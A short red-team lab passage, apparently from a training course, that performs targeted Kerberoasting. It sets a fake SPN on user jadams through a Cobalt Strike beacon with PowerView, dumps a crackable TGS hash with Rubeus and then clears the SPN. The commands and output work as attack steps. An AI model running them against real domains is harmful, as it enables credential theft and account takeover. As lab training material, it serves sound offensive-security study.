Instead of changing the password we can set an SPN on the account, kerberoast it and attempt to crack offline.

```
beacon> powershell Set-DomainObject -Identity jadams -Set @{serviceprincipalname="fake/NOTHING"}
beacon> powershell Get-DomainUser -Identity jadams -Properties ServicePrincipalName

serviceprincipalname
--------------------
fake/NOTHING

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /user:jadams /nowrap

[*] Action: Kerberoasting

[*] Target User            : jadams
[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 1

[*] SamAccountName         : jadams
[*] DistinguishedName      : CN=Joyce Adam,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] ServicePrincipalName   : fake/NOTHING
[*] PwdLastSet             : 3/10/2021 3:28:20 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT

[*] Hash                   : $krb5tgs$23$*jadams$dev.cyberbotic.io$fake/NOTHING*$7D84D4D25DD82A170B308A21FED2E1F5$B22A1E [...snip...] 56B2E7

beacon> powershell Set-DomainObject -Identity jadams -Clear ServicePrincipalName
```